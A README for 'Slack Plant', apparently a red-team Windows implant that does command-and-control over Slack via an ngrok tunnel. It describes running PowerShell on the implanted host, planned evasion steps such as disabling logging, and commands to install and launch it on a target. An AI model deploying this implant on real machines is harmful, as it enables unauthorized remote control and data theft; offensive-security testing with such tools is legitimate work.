# Slack Plant

Slack Plant is a Windows implant that performs C2 over slack via an NGROK tunnel.

## Currently Implemented Features:
- Download proxy through implanted host (uploads downloaded file to slack)
- Run PowerShell commands on implanted host -> output to slack
- Automatically open an NGROK tunnel and update the callback link on slack

## Planned Features
- Download files from implanted host
- Upload files to implanted host
- Disable logging and debug servers for better tradecraft
- Check-in with slack upon successful connect
- Run NGROK from memory instead of on disk
- Check if chromedriver exists, if not download chromedriver to chrome directory
- Expand supported OSs (*nix, MacOS, etc.)
- Add helper scripts to build a single PE for specified target

## Prerequisites
- Create a custom app in the [slack API](https://api.slack.com/) with the following Bot Token Scopes:
    - `channels:history`
    - `channels:read`
    - `chat:write`
    - `files:read`
    - `files:write`
    - `groups:history`
    - `groups:read`
    - `groups:write`
    - `im:history`
    - `im:read`
    - `im:write`
    - `incoming-webhook`
    - `links:read`
    - `links:write`
    - `mpim:history`
    - `mpim:read`
    - `mpim:write`
    - `remote_files:share`
    - `remote_files:read`
    - `remote_files:write`
- Enable Incoming Webhooks and add one for your app
- Enable Event Subscriptions and subscribe to message.channels, message.groups, message.im, and message.mpim
- Install on the workspace of your choice

## Installation

### On Target
Requires Python 3.7+

Either modify the script with the appropriate options or set the following environment variables:
```
SLACK_BOT_TOKEN=xoxb-1111111111111-1111111111111-11AAAAAAaaaaAAAAaaaaA # Token from OAuth & Permissions page in your slack app
SLACK_SIGNING_SECRET=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # Secret from Basic Information page in your slack app
SLACKBOT_WORKSPACE=example # Where workspace is example.slack.com/
SLACKBOT_USER=me@example.com # Your slack username for the workspace above
SLACKBOT_PASS=******** # Your slack password for the workspace above
SLACKBOT_APP=https://api.slack.com/apps/AAAAAAAAAAA # The link to your slack app 
NGROK_AUTH_TOKEN=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # Your auth token from ngrok.com - OPTIONAL
```

These steps need to take place on the target prior to being implanted:
```
#place chromedriver in same directory as Slack Plant
git clone https://github.com/jonebeabout/slackplant.git
pip3 install -r requirements.txt
python3 slackplant.py &
```

### On Operator Workstation
You may be able to compile necessary binaries on your operator workstation using pyinstaller or similar prior to implanting the target.
This is currently untested.

## License
[GNU GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html)